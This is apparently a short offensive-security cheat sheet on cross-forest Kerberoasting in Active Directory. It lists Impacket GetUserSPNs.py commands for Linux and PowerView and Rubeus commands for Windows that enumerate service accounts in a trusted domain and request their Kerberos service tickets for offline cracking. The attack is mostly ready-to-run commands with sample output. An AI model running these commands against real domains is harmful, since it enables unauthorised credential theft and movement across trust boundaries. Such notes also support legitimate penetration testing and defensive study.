---
title: "Cross-Forest : Kerberoasting"
date: 2025-12-03 02:54:40
categories:
  - Active Directory
  - Exploitation
  - Cross Forest
  - Kerberoasting
tags:
  - PowerView
  - Rubeus
---

# Linux

> To do this, we need credentials for a user that can authenticate into the other domain and specify the `-target-domain` flag in our command.

### Enumerate Users With SPN On The Target Domain

```bash
GetUserSPNs.py -target-domain <CrossDomainName> domain/our-user
```

### Request TGS

```bash
GetUserSPNs.py -request -target-domain <CrossDomainName> domain/our-user
```

# Windows

### Enumerate Users With SPN On The Target Domain

```powershell
PS C:\> Get-DomainUser -SPN -Domain <CrossDomainName> | select SamAccountName

samaccountname
--------------
krbtgt
mssqlsvc
```

> ➜ We see that there is one account with an SPN in the target domain which is `mssqlsvc`.

### Performing a Kerberoasting

> ➜ It’s the same as normal kerberoasting but in this case we add `/domain` and specify the target domain.

```powershell
PS C:\> .\Rubeus.exe kerberoast /domain:<CrossDomainName> /user:target-user /nowrap
```
